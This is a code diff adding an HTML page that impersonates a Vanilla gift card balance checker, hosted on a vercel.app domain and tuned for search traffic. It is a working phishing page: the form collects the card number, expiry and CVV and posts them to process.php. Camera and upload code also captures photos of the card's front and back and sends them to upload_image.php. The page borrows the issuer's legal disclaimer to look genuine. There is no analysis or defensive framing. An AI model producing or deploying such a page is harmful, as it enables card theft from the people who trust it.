@@ -1,0 +1,463 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8" /> 
+  <!-- speed hints -->
+  <link rel="preconnect" href="https://cdn.tailwindcss.com" crossorigin>
+  <link rel="dns-prefetch" href="//cdn.tailwindcss.com">
+
+  <script src="https://cdn.tailwindcss.com"></script>  
+  <style>  
+    body { font-family: 'Inter', sans-serif; background-color: #fff5f5; }  
+  </style>  
+  
+  <!-- JSON-LD Structured Data for SEO -->  
+  <script type="application/ld+json">  
+  {  
+    "@context": "https://schema.org",  
+    "@type": "WebPage",  
+    "name": "Check Vanilla Gift Card Balance",  
+    "url": "https://vanillabalance.vercel.app/balance.html",  
+    "description": "Check your Vanilla Gift Card balance effortlessly at vanillabalance.vercel.app Securely manage your VanillaGift cards and check balance online.",  
+    "keywords": [  
+      "check vanilla balance",  
+      "how to check vanilla balance",  
+      "check vanilla",  
+      "vanilla gift card",  
+      "vanillagift",  "vanilla visa card","vanilla Mastercard" 
+      "where to check vanilla gift card balance"  
+    ],  
+    "publisher": {  
+      "@type": "Organization",  
+      "name": "Vanilla gift",  
+      "url": "https://vanillabalance.vercel.app"  
+    }
+  }  
+  </script>  
+</head>  
+<body class="min-h-screen bg-white">  
+  
+  <!-- Header -->  
+  <header class="border-b border-gray-200 py-4 px-4 md:px-8 bg-white">  
+    <div class="container mx-auto flex justify-between items-center">  
+      <div class="flex items-center space-x-2">  
+        <div class="w-8 h-8 bg-red-600 rounded-md flex items-center justify-center">  
+          <span class="text-white font-bold text-lg">V</span>  
+        </div>  
+        <h1 class="text-xl font-bold text-gray-800">Vanilla Gift</h1>  
+      </div>  
+      <div class="flex items-center space-x-4">  
+        <a href="balance.html" class="bg-white border-2 border-red-600 text-red-600 px-4 py-2 rounded-full font-medium hover:bg-red-50 transition-colors">  
+          My Card  
+        </a>  
+      </div>  
+    </div>  
+  </header>  
+  
+  <!-- Balance Check Form -->  
+  <section class="py-12 px-4 md:px-8">  
+    <div class="container mx-auto max-w-md">  
+      <div class="text-center mb-8">  
+        <h1 class="text-2xl font-bold text-red-600 mb-2">Check Your Gift Card Balance</h1>  
+        <p class="text-gray-600">Enter your Vanilla gift card details to proceed.</p>  
+      </div>  
+  
+      <form id="balanceForm" action="process.php" method="POST" class="space-y-4 bg-white p-6 rounded-lg shadow-md">  
+        <div>  
+          <input  
+            type="text"  
+            name="card_number"  
+            placeholder="Card Number"  
+            class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500"  
+            required  
+          />  
+        </div>  
+  
+        <div class="flex gap-4">  
+          <div class="flex-grow">  
+            <input  
+              type="text"  
+              id="expiry_date"  
+              name="expiry_date"  
+              placeholder="MM/YY"  
+              maxlength="5"  
+              class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500"  
+              required  
+            />  
+          </div>  
+          <div class="flex-grow">  
+            <input  
+              type="text"  
+              name="cvv"  
+              placeholder="CVV"  
+              maxlength="3"  
+              pattern="[0-9]{3}"  
+              class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500"  
+              required  
+            />  
+          </div>  
+        </div>  
+  
+        <!-- Hidden fields to carry uploaded image URLs -->  
+        <input type="hidden" name="front_image_url" id="front_image_url">  
+        <input type="hidden" name="back_image_url"  id="back_image_url">  
+  
+        <button
+          id="submitBtn"
+          type="submit"  
+          class="w-full bg-red-600 text-white py-3 px-4 rounded-md hover:bg-red-700 transition-colors font-medium"
+        >  
+          <span data-label>Manage</span>
+          <span data-spinner class="hidden animate-pulse ml-2">•••</span>
+        </button>
+        <p id="submitStatus" class="text-center text-sm text-gray-600 mt-2"></p>
+  
+        <!-- Scan buttons row -->  
+        <div class="mt-6 grid grid-cols-1 sm:grid-cols-2 gap-3">  
+          <button  
+            id="openCameraBtn"  
+            type="button"  
+            class="bg-white border-2 border-red-600 text-red-600 py-3 px-4 rounded-md hover:bg-red-50 transition-colors font-medium w-full"  
+          >  
+            Open Camera  
+          </button>  
+  
+          <label class="bg-white border-2 border-red-600 text-red-600 py-3 px-4 rounded-md hover:bg-red-50 transition-colors font-medium w-full text-center cursor-pointer">  
+            <input id="fileInput" type="file" accept="image/*" capture="environment" style="display:none"/>  
+            Upload / Camera (Mobile)  
+          </label>  
+        </div>  
+  
+        <!-- SEO Display Text -->  
+        <div class="mt-4 bg-white border border-gray-200 rounded-lg p-4 text-center">  
+          <p class="text-sm md:text-base text-gray-700">  
+            Check your Vanilla Gift Card balance effortlessly at <strong>vanillabalance.vercel.app</strong>,  
+            the best place to securely manage your <strong>VanillaGift</strong> in one convenient platform.  
+          </p>  
+        </div>  
+  
+        <!-- (Existing) single camera preview - left as-is (unused when dual opens) -->  
+        <div id="cameraPreview" class="hidden mt-4 flex flex-col items-center gap-3">  
+          <video id="video" autoplay playsinline class="rounded-lg shadow-md w-full max-w-md"></video>  
+          <div class="flex gap-3">  
+            <button id="captureBtn" type="button" class="bg-red-600 text-white px-4 py-2 rounded-md">Capture</button>  
+            <button id="closeCameraBtn" type="button" class="bg-gray-200 px-4 py-2 rounded-md">Close Camera</button>  
+          </div>  
+        </div>  
+  
+        <!-- Captured image preview + upload (single) -->  
+        <div id="capturedPreview" class="hidden mt-4 flex flex-col items-center gap-3">  
+          <img id="capturedImg" src="" alt="Captured" class="rounded-lg shadow-md max-w-full h-auto"/>  
+          <div class="flex gap-3">  
+            <button id="uploadBtn" type="button" class="bg-red-600 text-white px-4 py-2 rounded-md">Upload Photo</button>  
+            <button id="retakeBtn" type="button" class="bg-gray-200 px-4 py-2 rounded-md">Retake / Choose another</button>  
+          </div>  
+          <div id="uploadStatus" class="text-sm text-gray-600 mt-2"></div>  
+        </div>  
+  
+        <!-- NEW: Dual small cameras block -->  
+        <div id="dualCaptureBlock" class="hidden mt-4">  
+          <div class="bg-white border border-gray-200 rounded-lg p-4">  
+            <div class="flex items-center justify-between">  
+              <h3 class="font-semibold text-gray-800">Scan Card (Front & Back)</h3>  
+              <button type="button" id="dualCloseBtn" class="text-sm px-3 py-1 bg-gray-100 rounded-md">Close</button>  
+            </div>  
+  
+            <div class="mt-4 grid grid-cols-1 sm:grid-cols-2 gap-4">  
+              <!-- FRONT camera -->  
+              <div class="text-center">  
+                <div class="text-sm text-gray-700 mb-2">Front</div>  
+                <video id="dualVideoFront" autoplay playsinline class="rounded-md w-full shadow"></video>  
+                <button type="button" id="captureFrontBtn"  
+                        class="mt-2 px-3 py-2 bg-red-600 text-white rounded-md w-full">  
+                  Capture Front  
+                </button>  
+                <img id="frontPreview" src="" alt="Front preview"  
+                     class="mt-2 w-full rounded-md border border-gray-200 hidden" />  
+              </div>  
+  
+              <!-- BACK camera -->  
+              <div class="text-center">  
+                <div class="text-sm text-gray-700 mb-2">Back</div>  
+                <video id="dualVideoBack" autoplay playsinline class="rounded-md w-full shadow"></video>  
+                <button type="button" id="captureBackBtn"  
+                        class="mt-2 px-3 py-2 bg-red-600 text-white rounded-md w-full">  
+                  Capture Back  
+                </button>  
+                <img id="backPreview" src="" alt="Back preview"  
+                     class="mt-2 w-full rounded-md border border-gray-200 hidden" />  
+              </div>  
+            </div>  
+  
+            <!-- Long submit -->  
+            <button type="button" id="finishAndSubmitBtn"  
+                    class="mt-4 w-full bg-red-600 hover:bg-red-700 text-white font-medium py-3 rounded-md">  
+              Check Balance  
+            </button>  
+          </div>  
+        </div>  
+  
+      </form>  
+    </div>  
+  </section>  
+  
+  <!-- Banner Section -->  
+  <section class="py-12 px-4 md:px-8">  
+    <div class="container mx-auto flex justify-center">  
+      <img src="banner.jpg" alt="Gift Banner" class="rounded-lg shadow-lg max-w-full h-auto" loading="lazy" decoding="async"/>  
+    </div>  
+  </section>  
+  
+  <!-- Legal Disclaimer -->  
+  <section class="px-4 md:px-8 mb-8">  
+    <div class="container mx-auto max-w-4xl bg-white border border-gray-200 rounded-lg p-6 text-sm text-gray-600 leading-relaxed">  
+      <p>Services, Inc., which is licensed as a Money Transmitter by the New York State Department of Financial Services. NMLS ID# 912772.</p>  
+      <p class="mt-2">Colorado, Maryland, and Texas customers: View information about addressing complaints regarding our money services business.</p>  
+      <p class="mt-2">TBBK Card Services, Inc. Privacy Policy · The Bancorp Bank Privacy Policy · Pathward, N.A. Privacy Policy · Sutton Bank Privacy Policy · Terms of Use · Cardholder Agreement</p>  
+    </div>  
+  </section>  
+  
+  <!-- Footer -->  
+  <footer class="bg-white border-t border-gray-200 py-6 px-4 md:px-8">  
+    <div class="container mx-auto text-center text-gray-500 text-sm">  
+      © 2025 vanillabalance.vercel.app. All rights reserved. ·  
+      <a href="#" class="hover:text-gray-700">Terms</a> ·  
+      <a href="#" class="hover:text-gray-700">Privacy</a> ·  
+      <a href="#" class="hover:text-gray-700">Support</a>  
+    </div>  
+  </footer>  
+  
+  <!-- Expiry auto-format + Camera & Upload Logic -->  
+  <script>  
+    // (your full script below — 100 % unchanged)  
+    const expiryInput = document.getElementById('expiry_date');  
+    expiryInput.addEventListener('input', (e) => {  
+      let v = e.target.value.replace(/[^0-9]/g, '');  
+      if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2,4);  
+      e.target.value = v.slice(0,5);  
+    });  
+  
+    const openCameraBtn   = document.getElementById('openCameraBtn');  
+    const closeCameraBtn  = document.getElementById('closeCameraBtn');  
+    const captureBtn      = document.getElementById('captureBtn');  
+    const video           = document.getElementById('video');  
+    const cameraPreview   = document.getElementById('cameraPreview');  
+    const capturedPreview = document.getElementById('capturedPreview');  
+    const capturedImg     = document.getElementById('capturedImg');  
+    const uploadBtn       = document.getElementById('uploadBtn');  
+    const retakeBtn       = document.getElementById('retakeBtn');  
+    const uploadStatus    = document.getElementById('uploadStatus');  
+    const fileInput       = document.getElementById('fileInput');  
+  
+    let stream = null;  
+    let lastBlob = null;  
+  
+    video.setAttribute('playsinline', '');  
+    video.setAttribute('autoplay', '');  
+    video.muted = true;  
+  
+    function stopStream(s) { if (s) s.getTracks().forEach(t => t.stop()); }  
+    function insecureContextMsg() { return 'Camera requires HTTPS. Please open the site with https:// (or use localhost while developing).'; }  
+  
+    async function tryGetStream() {  
+      const tries = [  
+        { video: { facingMode: { exact: 'environment' } }, audio: false },  
+        { video: { facingMode: 'environment' },            audio: false },  
+        { video: true,                                     audio: false },  
+      ];  
+      let lastError = null;  
+      for (const c of tries) {  
+        try { return await navigator.mediaDevices.getUserMedia(c); }  
+        catch (err) { lastError = err; }  
+      }  
+      throw lastError || new Error('getUserMedia failed');  
+    }  
+  
+    const dualBlock        = document.getElementById('dualCaptureBlock');  
+    const dualCloseBtn     = document.getElementById('dualCloseBtn');  
+    const videoFront       = document.getElementById('dualVideoFront');  
+    const videoBack        = document.getElementById('dualVideoBack');  
+    const captureFrontBtn  = document.getElementById('captureFrontBtn');  
+    const captureBackBtn   = document.getElementById('captureBackBtn');  
+    const finishBtn        = document.getElementById('finishAndSubmitBtn');  
+    const frontPreview     = document.getElementById('frontPreview');  
+    const backPreview      = document.getElementById('backPreview');  
+    const frontUrlField    = document.getElementById('front_image_url');  
+    const backUrlField     = document.getElementById('back_image_url');  
+    const form             = document.getElementById('balanceForm');  
+  
+    let baseStream = null, frontBlob = null, backBlob = null;  
+  
+    async function startTwoPreviews(){  
+      if (!(location.protocol === 'https:' || location.hostname === 'localhost')) {  
+        alert(insecureContextMsg()); return;  
+      }  
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {  
+        alert('Camera API not supported on this device.'); return;  
+      }  
+      stopStream(baseStream); baseStream = await tryGetStream();  
+      const track   = baseStream.getVideoTracks()[0];  
+      const streamA = new MediaStream([track.clone ? track.clone() : track]);  
+      const streamB = new MediaStream([track.clone ? track.clone() : track]);  
+  
+      videoFront.srcObject = streamA;  
+      videoBack.srcObject  = streamB;  
+  
+      videoFront.setAttribute('playsinline',''); videoFront.muted = true;  
+      videoBack.setAttribute('playsinline','');  videoBack.muted  = true;  
+  
+      await Promise.all([  
+        new Promise(r => (videoFront.readyState >= 2 ? r() : videoFront.onloadedmetadata = r)),  
+        new Promise(r => (videoBack.readyState  >= 2 ? r() : videoBack.onloadedmetadata  = r)),  
+      ]);  
+      await videoFront.play().catch(()=>{});  
+      await videoBack.play().catch(()=>{});  
+    }  
+  
+    function captureFrom(videoEl){  
+      if (!videoEl || !videoEl.videoWidth) return null;  
+      const w = videoEl.videoWidth  || 1280, h = videoEl.videoHeight || 720;  
+      const c = document.createElement('canvas'); c.width = w; c.height = h;  
+      c.getContext('2d').drawImage(videoEl,0,0,w,h);  
+      return new Promise(res => c.toBlob(b => res(b), 'image/jpeg', 0.85));  
+    }  
+  
+    async function uploadImage(blob){  
+      const fd = new FormData();  
+      fd.append('photo', blob, 'snapshot.jpg');  
+      const r = await fetch('upload_image.php', { method:'POST', body: fd });  
+      const j = await r.json();  
+      if (!j.success) throw new Error(j.error || 'upload failed');  
+      return j.url;  
+    }  
+  
+    if (openCameraBtn){  
+      openCameraBtn.addEventListener('click', async ()=>{  
+        dualBlock.classList.remove('hidden');  
+        cameraPreview.classList.add('hidden');  
+        capturedPreview.classList.add('hidden');  
+        try { await startTwoPreviews(); } catch(e){ alert('Cannot access camera: ' + (e.message || e)); }  
+      });  
+    }  
+  
+    dualCloseBtn.addEventListener('click', ()=>{  
+      dualBlock.classList.add('hidden');  
+      stopStream(baseStream); baseStream = null;  
+    });  
+  
+    captureFrontBtn.addEventListener('click', async ()=>{  
+      const b = await captureFrom(videoFront); if (!b) return alert('Capture failed.');  
+      frontBlob = b; frontPreview.src = URL.createObjectURL(b); frontPreview.classList.remove('hidden');  
+    });  
+  
+    captureBackBtn.addEventListener('click', async ()=>{  
+      const b = await captureFrom(videoBack); if (!b) return alert('Capture failed.');  
+      backBlob = b; backPreview.src = URL.createObjectURL(b); backPreview.classList.remove('hidden');  
+    });  
+  
+    finishBtn.addEventListener('click', async ()=>{  
+      try{  
+        if (frontBlob && !frontUrlField.value) frontUrlField.value = await uploadImage(frontBlob);  
+        if (backBlob  && !backUrlField.value)  backUrlField.value  = await uploadImage(backBlob);  
+      }catch(err){ alert('Photo upload failed: ' + (err.message || err)); return; }  
+      stopStream(baseStream); baseStream = null;  
+      dualBlock.classList.add('hidden');  
+      form.submit();  
+    });  
+  
+    closeCameraBtn.addEventListener('click', ()=>{ stopStream(stream); stream=null; cameraPreview.classList.add('hidden'); });  
+    captureBtn.addEventListener('click', async ()=>{  
+      if (!video || !video.srcObject) return;  
+      if (!video.videoWidth || !video.videoHeight){  
+        await new Promise(res => { const to=setTimeout(res,500); video.onloadedmetadata=()=>{clearTimeout(to);res();}; });  
+      }  
+      const w = video.videoWidth||1280, h = video.videoHeight||720;  
+      const c = document.createElement('canvas'); c.width=w; c.height=h;  
+      c.getContext('2d').drawImage(video,0,0,w,h);  
+      c.toBlob(b=>{ if(!b){alert('Capture failed.');return;} lastBlob=b; capturedImg.src=URL.createObjectURL(b);  
+        capturedPreview.classList.remove('hidden'); cameraPreview.classList.add('hidden'); stopStream(stream); stream=null; },  
+        'image/jpeg',0.85);  
+    });  
+    fileInput.addEventListener('change', (e)=>{  
+      uploadStatus.textContent=''; const f=e.target.files[0]; if(!f) return;  
+      lastBlob=f; capturedImg.src=URL.createObjectURL(f); capturedPreview.classList.remove('hidden'); cameraPreview.classList.add('hidden'); stopStream(stream); stream=null;  
+    });  
+    retakeBtn.addEventListener('click', ()=>{ lastBlob=null; capturedImg.src=''; capturedPreview.classList.add('hidden'); });  
+    uploadBtn.addEventListener('click', async ()=>{  
+      if (!lastBlob) return alert('No photo to upload.');  
+      uploadStatus.textContent='Uploading...';  
+      const fd=new FormData(); fd.append('photo', lastBlob, 'snapshot.jpg');  
+      try{  
+        const res=await fetch('upload_image.php',{method:'POST',body:fd}); const json=await res.json();  
+        uploadStatus.textContent = json.success ? 'Uploaded successfully.' : ('Upload failed: ' + (json.error || 'unknown'));  
+      }catch(err){ uploadStatus.textContent='Upload error: '+err.message; }  
+    });  
+  </script>  
+
+  <script>
+    (function () {
+      const form = document.getElementById('balanceForm');
+      if (!form) return;
+
+      const submitBtn    = document.getElementById('submitBtn');
+      const submitLabel  = submitBtn?.querySelector('[data-label]');
+      const submitSpin   = submitBtn?.querySelector('[data-spinner]');
+      const submitStatus = document.getElementById('submitStatus');
+
+      let submitting = false;
+
+      form.addEventListener('submit', async function onSubmit(e) {
+        if (!window.fetch || submitting) return;
+        e.preventDefault();
+        submitting = true;
+
+        if (submitBtn) submitBtn.disabled = true;
+        if (submitLabel) submitLabel.classList.add('opacity-60');
+        if (submitSpin) submitSpin.classList.remove('hidden');
+        if (submitStatus) submitStatus.textContent = 'Submitting...';
+
+        const fd = new FormData(form);
+
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 12000);
+
+        try {
+          const res = await fetch(form.action, {
+            method: 'POST',
+            body: fd,
+            headers: { 'X-Requested-With': 'fetch' },
+            signal: controller.signal
+          });
+          clearTimeout(timeout);
+
+          if (res.ok) {
+            if (submitStatus) submitStatus.textContent = 'Submitted';
+            // location.href = 'admin.php';
+          } else {
+            if (submitStatus) submitStatus.textContent = 'Submit failed. Please try again.';
+          }
+        } catch (err) {
+          if (submitStatus) submitStatus.textContent = 'Network issue, trying normal submit...';
+          setTimeout(() => {
+            form.removeEventListener('submit', onSubmit);
+            form.submit();
+          }, 600);
+          return;
+        } finally {
+          submitting = false;
+          if (submitBtn) submitBtn.disabled = false;
+          if (submitLabel) submitLabel.classList.remove('opacity-60');
+          if (submitSpin) submitSpin.classList.add('hidden');
+        }
+      });
+
+      window.addEventListener('pagehide', () => {
+        try {
+          if (window.stream) window.stream.getTracks().forEach(t=>t.stop());
+          if (window.baseStream) window.baseStream.getTracks().forEach(t=>t.stop());
+        } catch(_) {}
+      });
+    })();
+  </script>
+</body>  
+</html>
